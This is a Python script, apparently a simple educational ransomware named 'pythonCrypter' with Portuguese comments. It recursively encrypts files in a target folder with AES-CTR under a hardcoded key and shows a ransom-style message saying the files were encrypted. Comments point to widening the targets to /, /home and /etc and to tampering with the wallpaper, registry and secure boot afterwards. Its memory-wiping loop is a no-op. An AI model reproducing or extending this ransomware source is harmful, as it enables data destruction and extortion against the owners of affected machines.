from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import crypter

# A senha deve ter os seguintes tamanhos:
# 128/192/256 bits - 8 bits = 1 byte = 1 letra unicode

HARDCODED_KEY = 'abcdefghijklmnopqrstuvwxyz123456'


def getParser():
    parser = argparse.ArgumentParser(description="pythonCrypter")
    parser.add_argument(
        '-d', '--decrypt', help='Decripta os arquivos [default: no]', action='store_true')
    return parser


def main():
    parser = getParser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
			-= Python Crypter =-
			Seus arquivos foram criptografados!
			Para decriptá-los utilize a seguinte senha '{}'
		'''.format(HARDCODED_KEY))

        key = input('Digite a senha: ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFunc = crypt.encrypt
    else:
        cryptFunc = crypt.decrypt

    initPath = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [initPath]  # /, /home, /etc

    for currentDir in startDirs:
        for fileName in discovery.discovery(currentDir):
            crypter.changeFiles(fileName, cryptFunc)

    # Limpa a chave de criptografia da memória
    for _ in range(100):
        pass

    if not decrypt:
        pass
        # Após a encriptação, você pode alterar o wallpaper
        # Alterar os icones, regedit, admin, bios secure boot, etc


if __name__ == '__main__':
    main()
